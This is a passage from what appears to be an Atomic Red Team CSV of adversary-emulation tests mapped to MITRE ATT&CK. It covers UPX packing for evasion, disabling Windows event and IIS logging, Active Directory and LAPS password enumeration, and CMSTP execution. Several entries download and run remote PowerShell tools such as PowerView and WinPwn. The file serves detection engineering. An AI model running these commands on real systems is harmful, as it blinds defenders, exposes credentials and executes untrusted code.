",command_prompt,True,,,,,"input_arguments.drive_letter.description: Drive letter to source VSC (including colon)

input_arguments.drive_letter.type: string

input_arguments.drive_letter.default: C:

input_arguments.symlink_path.description: symlink path

input_arguments.symlink_path.type: string

input_arguments.symlink_path.default: C:\Temp\vssstore

"
T1647,Plist File Modification,Plist Modification,394a538e-09bb-4a4a-95d1-b93cf12682a8,"Modify MacOS plist file in one of two directories
",macos,,,,manual,,"1. Modify a .plist in

    /Library/Preferences

    OR

    ~/Library/Preferences

2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
",,,,
T1027.002,Obfuscated Files or Information: Software Packing,Binary simply packed by UPX (linux),11c46cd8-e471-450e-acb8-52a1216ae6a4,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.
No other protection/compression were applied.
",linux,,,"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
",sh,,,"rm /tmp/packed_bin
",,,"input_arguments.bin_path.description: Packed binary

input_arguments.bin_path.type: path

input_arguments.bin_path.default: PathToAtomicsFolder/T1027.002/bin/linux/test_upx

"
T1027.002,Obfuscated Files or Information: Software Packing,"Binary packed by UPX, with modified headers (linux)",f06197f8-ff46-48c2-a0c6-afc1b50665e1,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.

The UPX magic number (`0x55505821`, ""`UPX!`"") was changed to (`0x4c4f5452`, ""`LOTR`""). This prevents the binary from being detected
by some methods, and especially UPX is not able to uncompress it any more.
",linux,,,"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
",sh,,,"rm /tmp/packed_bin
",,,"input_arguments.bin_path.description: Packed binary

input_arguments.bin_path.type: path

input_arguments.bin_path.default: PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed

"
T1027.002,Obfuscated Files or Information: Software Packing,Binary simply packed by UPX,b16ef901-00bb-4dda-b4fc-a04db5067e20,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.
No other protection/compression were applied.
",macos,,,"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
",sh,,,"rm /tmp/packed_bin
",,,"input_arguments.bin_path.description: Packed binary

input_arguments.bin_path.type: path

input_arguments.bin_path.default: PathToAtomicsFolder/T1027.002/bin/darwin/test_upx

"
T1027.002,Obfuscated Files or Information: Software Packing,"Binary packed by UPX, with modified headers",4d46e16b-5765-4046-9f25-a600d3e65e4d,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.

The UPX magic number (`0x55505821`, ""`UPX!`"") was changed to (`0x4c4f5452`, ""`LOTR`""). This prevents the binary from being detected
by some methods, and especially UPX is not able to uncompress it any more.
",macos,,,"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
",sh,,,"rm /tmp/packed_bin
",,,"input_arguments.bin_path.description: Packed binary

input_arguments.bin_path.type: path

input_arguments.bin_path.default: PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed

"
T1562.002,Impair Defenses: Disable Windows Event Logging,Disable Windows IIS HTTP Logging,69435dcf-c66f-4ec0-a8b1-82beb76b34db,"Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
This action requires HTTP logging configurations in IIS to be unlocked.

Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)
",windows,,,"C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:true
",powershell,,,"if(Test-Path ""C:\Windows\System32\inetsrv\appcmd.exe""){
  C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:false *>$null
}
",,,"input_arguments.website_name.description: The name of the website on a server

input_arguments.website_name.type: string

input_arguments.website_name.default: Default Web Site

"
T1562.002,Impair Defenses: Disable Windows Event Logging,Disable Windows IIS HTTP Logging via PowerShell,a957fb0f-1e85-49b2-a211-413366784b1e,"Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
This action requires HTTP logging configurations in IIS to be unlocked.

Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)
",windows,,,"set-WebConfigurationProperty -PSPath ""IIS:\Sites\#{website_name}\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true
",powershell,,,"if(Test-Path ""C:\Windows\System32\inetsrv\appcmd.exe""){
  C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:false *>$null
}
",,,"input_arguments.website_name.description: The name of the website on a server

input_arguments.website_name.type: string

input_arguments.website_name.default: Default Web Site

"
T1562.002,Impair Defenses: Disable Windows Event Logging,Kill Event Log Service Threads,41ac52ba-5d5e-40c0-b267-573ed90489bd,Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html,windows,,,"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
",powershell,True,,"Write-Host ""NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"" -fore red
Remove-Item ""$env:TEMP\Invoke-Phant0m.ps1"" -ErrorAction Ignore
",,,
T1562.002,Impair Defenses: Disable Windows Event Logging,Impair Windows Audit Log Policy,5102a3a7-e2d7-4129-9e45-f483f2e0eea8,"Disables the windows audit policy to prevent key host based telemetry being written into the event logs.
[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",windows,,,"auditpol /set /category:""Account Logon"" /success:disable /failure:disable
auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable
auditpol /set /category:""Detailed Tracking"" /success:disable
",command_prompt,True,,"auditpol /set /category:""Account Logon"" /success:enable /failure:enable
auditpol /set /category:""Detailed Tracking"" /success:enable
auditpol /set /category:""Logon/Logoff"" /success:enable /failure:enable
",,,
T1562.002,Impair Defenses: Disable Windows Event Logging,Clear Windows Audit Policy Config,913c0e4e-4b37-4b78-ad0b-90e7b25010f6,Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.,windows,,,"auditpol /clear /y
auditpol /remove /allusers
",command_prompt,True,,"auditpol /set /category:""Account Logon"" /success:enable /failure:enable
auditpol /set /category:""Detailed Tracking"" /success:enable
auditpol /set /category:""Logon/Logoff"" /success:enable /failure:enable
",,,
T1562.002,Impair Defenses: Disable Windows Event Logging,Disable Event Logging with wevtutil,b26a3340-dad7-4360-9176-706269c74103,"Wevtutil can be used to disable logs. 
NOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.
",windows,,,"wevtutil sl ""#{log_name}"" /e:false
",command_prompt,,,"wevtutil sl ""#{log_name}"" /e:true
",,,"input_arguments.log_name.description: Name of the log to be disabled

input_arguments.log_name.type: string

input_arguments.log_name.default: Microsoft-Windows-IKE/Operational

"
T1562.002,Impair Defenses: Disable Windows Event Logging,Makes Eventlog blind with Phant0m,3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741,"Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
",windows,,,"""#{file_name}""
",command_prompt,,,"echo ""Sorry you have to reboot""
",powershell,"dependencies.0.description: Phant0m.exe must exist on disk at specified location (#{file_name})

dependencies.0.prereq_command: if (Test-Path ""#{file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe"" -OutFile ""#{file_name}"" -UseBasicParsing

","input_arguments.file_name.description: exe version of Phant0m

input_arguments.file_name.type: path

input_arguments.file_name.default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe

"
T1087.002,Account Discovery: Domain Account,Enumerate all accounts (Domain),6fbc9e68-5ad7-444a-bd11-8bf3136c477e,"Enumerate all accounts
Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
",windows,,,"net user /domain
net group /domain
",command_prompt,,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate all accounts via PowerShell (Domain),8b8a6449-be98-4f42-afd2-dedddc7453b2,"Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.
",windows,,,"net user /domain
get-localgroupmember -group Users
get-aduser -filter *
",powershell,,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate logged on users via CMD (Domain),161dcd85-d014-4f5e-900c-d3eaae82a0f7,"Enumerate logged on users. Upon exeuction, logged on users will be displayed.
",windows,,,"query user /SERVER:#{computer_name}
",command_prompt,,,,,,"input_arguments.computer_name.description: Name of remote system to query

input_arguments.computer_name.type: string

input_arguments.computer_name.default: %COMPUTERNAME%

"
T1087.002,Account Discovery: Domain Account,Automated AD Recon (ADRecon),95018438-454a-468c-a0fa-59c800149b59,"ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its
path will be displayed.
",windows,,,"Invoke-Expression ""#{adrecon_path}""
",powershell,,,"Get-ChildItem ""PathToAtomicsFolder\..\ExternalPayloads"" -Recurse -Force | Where{$_.Name -Match ""^ADRecon-Report-""} | Remove-Item -Force -Recurse
",powershell,"dependencies.0.description: ADRecon must exist on disk at specified location (#{adrecon_path})

dependencies.0.prereq_command: if (Test-Path ""#{adrecon_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1"" -OutFile ""#{adrecon_path}""

","input_arguments.adrecon_path.description: Path of ADRecon.ps1 file

input_arguments.adrecon_path.type: path

input_arguments.adrecon_path.default: PathToAtomicsFolder\..\ExternalPayloads\ADRecon.ps1

"
T1087.002,Account Discovery: Domain Account,Adfind -Listing password policy,736b4f53-f400-4c22-855d-1a6b5a551600,"Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.
reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory Admins,b95fd967-4e62-4109-b48d-265edfd28c3a,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts
reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory User Objects,e1ec8d20-509a-4b9a-b820-06c9b2da8eb7,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory Exchange AD Objects,5e2938fb-f919-47b6-8b29-2f6a1f718e99,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1087.002,Account Discovery: Domain Account,Enumerate Default Domain Admin Details (Domain),c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef,"This test will enumerate the details of the built-in domain admin account
",windows,,,"net user administrator /domain
",command_prompt,,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate Active Directory for Unconstrained Delegation,46f8dbe9-22a5-4770-8513-66119c5be63b,"Attackers may attempt to query for computer objects with the UserAccountControl property
'TRUSTED_FOR_DELEGATION' (0x80000;524288) set
More Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce
Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user
",windows,,,"Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
",powershell,False,,,,"dependencies.0.description: PowerShell ActiveDirectory Module must be installed

dependencies.0.prereq_command: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
}
Catch {
    exit 1
}

dependencies.0.get_prereq_command: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}

","input_arguments.domain.description: Domain FQDN

input_arguments.domain.type: string

input_arguments.domain.default: $env:UserDnsDomain

input_arguments.uac_prop.description: UAC Property to search

input_arguments.uac_prop.type: integer

input_arguments.uac_prop.default: 524288

"
T1087.002,Account Discovery: Domain Account,Get-DomainUser with PowerView,93662494-5ed7-4454-a04c-8c8372808ac2,"Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
",powershell,,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate Active Directory Users with ADSISearcher,02e8be5a-3065-4e54-8cc8-a14d138834d3,"The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
Upon successful execution a listing of users will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
",windows,,,"([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()
",powershell,False,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate Linked Policies In ADSISearcher Discovery,7ab0205a-34e4-4a44-9b04-e1541d1a57be,"The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.
Upon successful execution a listing of users will output with their paths in AD.
Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
",windows,,,"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}
",powershell,False,,,,,
T1087.002,Account Discovery: Domain Account,Enumerate Root Domain linked policies Discovery,00c652e2-0750-4ca6-82ff-0204684a6fe4,"The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.
Upon successful execution a listing of users will output with their paths in AD.
Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
",windows,,,"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}
",powershell,False,,,,,
T1087.002,Account Discovery: Domain Account,WinPwn - generaldomaininfo,ce483c35-c74b-45a7-a670-631d1e69db3d,Gathers general domain information using the generaldomaininfo function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput",powershell,,,,,,
T1087.002,Account Discovery: Domain Account,Kerbrute - userenum,f450461c-18d1-4452-9f0d-2c42c3f08624,Enumerates active directory usernames using the userenum function of Kerbrute,windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""",powershell,,,,powershell,"dependencies.0.description: kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""

dependencies.1.description: username text file must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.1.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""){exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""

","input_arguments.Domain.description: Domain that is being tested against

input_arguments.Domain.type: string

input_arguments.Domain.default: $env:USERDOMAIN

input_arguments.DomainController.description: Domain Controller that is being tested against

input_arguments.DomainController.type: string

input_arguments.DomainController.default: $env:UserDnsDomain

"
T1087.002,Account Discovery: Domain Account,Wevtutil - Discover NTLM Users Remote,b8a563d4-a836-4993-a74e-0a19b8481bfe,"This test discovers users who have authenticated against a Domain Controller via NTLM. 
This is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)
",windows,,,"$target = $env:LOGONSERVER
$target = $target.Trim(""\\"")
$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\""Event[System[(EventID=4776)]]""'",powershell,,,"Remove-Item -Path \\$IpAddress\c$\ntlmusers.evtx
",,,
T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with Get-ADComputer all properties,394012d9-2164-4d4f-b9e5-acf30ba933fe,This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,Get-ADComputer #{hostname} -Properties *,powershell,False,,,,,"input_arguments.hostname.description: Name of the host

input_arguments.hostname.type: string

input_arguments.hostname.default: $env:computername

"
T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,6e85bdf9-7bc4-4259-ac0f-f0cb39964443,This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",powershell,False,,,,,"input_arguments.hostname.description: Name of the host

input_arguments.hostname.type: string

input_arguments.hostname.default: $env:computername

"
T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,ffbcfd62-15d6-4989-a21a-80bfc8e58bb5,This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *",powershell,False,,,,,
T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind all properties,abf00f6c-9983-4d9a-afbc-6b1c6c6448e1,This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *
",powershell,False,,,,,"input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

input_arguments.domain.description: Domain of the host

input_arguments.domain.type: string

input_arguments.domain.default: $env:USERDOMAIN

"
T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,51a98f96-0269-4e09-a10f-e307779a8b05,This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
",powershell,False,,,,,"input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

input_arguments.domain.description: Domain of the host

input_arguments.domain.type: string

input_arguments.domain.default: $env:USERDOMAIN

"
T1087.002,Account Discovery: Domain Account,Active Directory Domain Search,096b6d2a-b63f-4100-8fa0-525da4cd25ca,"Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory
",linux,,,"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b ""CN=Users,DC=#{domain},DC=#{top_level_domain}"" -s sub -a always -z 1000 dn
",sh,False,,,sh,"dependencies.0.description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch

dependencies.0.prereq_command: which ldapsearch

dependencies.0.get_prereq_command: echo ldapsearch not found

","input_arguments.domain.description: The domain to be tested

input_arguments.domain.type: string

input_arguments.domain.default: example

input_arguments.top_level_domain.description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)

input_arguments.top_level_domain.type: string

input_arguments.top_level_domain.default: test

input_arguments.user.description: username@domain of a user within the ad database

input_arguments.user.type: string

input_arguments.user.default: user@example.test

input_arguments.password.description: password of the user with admin privileges referenced in admin_user

input_arguments.password.type: string

input_arguments.password.default: s3CurePssw0rD!

"
T1087.002,Account Discovery: Domain Account,Account Enumeration with LDAPDomainDump,a54d497e-8dbe-4558-9895-44944baa395f,"This test uses LDAPDomainDump to perform account enumeration on a domain.
[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)
",linux,,,ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087,sh,False,,"rm -rf /tmp/T1087/ 2>/dev/null 
",sh,"dependencies.0.description: Python3 must be installed
dependencies.0.prereq_command: if [ -x ""$(command -v python3 --version)"" ]; then exit 0; else exit 1; fi;
dependencies.0.get_prereq_command: sudo apt-get -y install python3
dependencies.1.description: Pip must be installed
dependencies.1.prereq_command: if [ -x ""$(command -v pip --version)"" ]; then exit 0; else exit 1; fi;
dependencies.1.get_prereq_command: wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py
python3 /tmp/get-pip.py
dependencies.2.description: The ldapdomaindump module must be installed
dependencies.2.prereq_command: python3 -c 'import ldapdomaindump' 2>/dev/null
dependencies.2.get_prereq_command: pip install ldapdomaindump
dependencies.3.description: The future module must be installed
dependencies.3.prereq_command: python3 -c 'import future' 2>/dev/null
dependencies.3.get_prereq_command: pip install future
","input_arguments.username.description: Username and domain to authenticate with

input_arguments.username.type: string

input_arguments.username.default: domain\user

input_arguments.target_ip.description: IP to connect to

input_arguments.target_ip.type: string

input_arguments.target_ip.default: 127.0.0.1

input_arguments.password.description: Password to authenticate with

input_arguments.password.type: string

input_arguments.password.default: password

"
T1218.003,Signed Binary Proxy Execution: CMSTP,CMSTP Executing Remote Scriptlet,34e63321-9683-496b-bbc1-7566bc55e624,"Adversaries may supply CMSTP.exe with INF files infected with malicious commands
",windows,,,"cmstp.exe /s ""#{inf_file_path}""
",command_prompt,,,,powershell,"dependencies.0.description: INF file must exist on disk at specified location (#{inf_file_path})

dependencies.0.prereq_command: if (Test-Path ""#{inf_file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_file_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf"" -OutFile ""#{inf_file_path}""

","input_arguments.inf_file_path.description: Path to the INF file

input_arguments.inf_file_path.type: path

input_arguments.inf_file_path.default: PathToAtomicsFolder\T1218.003\src\T1218.003.inf

"
T1218.003,Signed Binary Proxy Execution: CMSTP,CMSTP Executing UAC Bypass,748cb4f6-2fb3-4e97-b7ad-b22635a09ab0,"Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file
